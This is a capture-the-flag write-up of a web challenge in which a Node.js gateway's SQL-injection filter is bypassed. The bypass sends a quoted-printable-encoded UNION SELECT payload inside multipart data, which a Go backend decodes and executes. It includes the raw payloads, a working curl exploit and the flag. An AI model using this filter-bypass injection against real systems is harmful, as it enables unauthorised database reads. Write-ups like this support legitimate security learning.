---
title: "Secure Gate Writeup"
description: "I made a simple note app protected by a secure gateway."
event: "TKB CTF"
year: 2025
category: web
tags: ["web"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "tkbctf/secure-gate/secure-gate"
featured: false
flagsHidden: false
---

> Imported from [tkbctf/secure-gate/secure-gate](https://github.com/R3izorr/CTF_writeup/tree/main/tkbctf/secure-gate/secure-gate).

# Secure Gate Writeup

## Challenge

I made a simple note app protected by a secure gateway.

## Goal

Get the hidden flag from the app.

## App structure

The app has 2 parts:

1. A gateway / proxy in Node.js
2. A backend in Go with SQLite

The gateway tries to block SQL injection.
The backend stores normal notes and also stores the flag in a secret table.

## Main bug

The search feature builds SQL by putting user input directly into the query.

Example idea:

```sql
SELECT ... FROM notes WHERE content LIKE '%USER_INPUT%'
```

This is unsafe because if we control `USER_INPUT`, we can change the SQL query.

## Why the gateway can be bypassed

The gateway and the backend do not read multipart form data the same way.

- The gateway checks the multipart field with Busboy
- The backend reads it again with Go's ParseMultipartForm

We can send the field with:

```text
Content-Transfer-Encoding: quoted-printable
```

Then:

- The gateway sees encoded text
- The backend decodes it into the real payload

So the gateway thinks the input is safe, but the backend executes SQL injection.

## Simple test

A normal payload like this is blocked:

```text
' OR 1=1--
```

But if the same payload is sent in quoted-printable form inside multipart data, it passes the gateway.

## Getting the flag

There is a hidden table called `secrets` with a column named `value`.

We can use `UNION SELECT` to return the flag as if it were a normal note.

Decoded payload:

```sql
' UNION SELECT 999,'FLAG',value,'2026-01-01' FROM secrets-- 
```

Why this works:

- `999` matches the `id` column
- `'FLAG'` becomes the note title
- `value` is the flag
- `'2026-01-01'` matches the date column
- `-- ` comments out the rest of the original query

## Working exploit

```bash
curl -s -X POST 'http://35.194.108.145:59793/api/notes/search' \
  -H 'Content-Type: multipart/form-data; boundary=x' \
  --data-binary $'--x\r\nContent-Disposition: form-data; name="q"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n=27=20=55=4E=49=4F=4E=20=53=45=4C=45=43=54=20=39=39=39=2C=27=46=4C=41=47=27=2C=76=61=6C=75=65=2C=27=32=30=32=36=2D=30=31=2D=30=31=27=20=46=52=4F=4D=20=73=65=63=72=65=74=73=2D=2D=20\r\n--x--\r\n'
```

## Flag

```text
tkbctf{cr0ss1ng_th3_b0und4ry_w1th_rfc2231}
```

## Short summary

The backend had SQL injection.
The gateway tried to block it, but it checked the request differently from the backend.
By sending the payload in quoted-printable multipart format, the gateway saw safe encoded text while the backend saw real SQL.
That allowed us to read the flag from the `secrets` table.

